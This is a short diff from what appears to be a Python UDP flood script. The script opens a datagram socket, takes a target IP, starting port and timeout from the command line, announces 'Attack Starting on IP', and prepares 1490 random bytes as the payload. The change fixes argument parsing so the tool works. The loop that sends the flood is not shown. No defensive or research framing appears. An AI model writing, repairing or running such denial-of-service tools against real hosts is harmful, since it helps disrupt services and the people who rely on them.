@@ -8,8 +8,8 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 #############
 
 ip = sys.argv[1]
-starting_port = sys.argv[2]
-timeout = sys.argv[3]
+starting_port = int(sys.argv[2])
+timeout = int(sys.argv[3])
 print("Attack Starting on IP %s", ip)
 send_bytes = os.urandom(1490)
 sent = 0
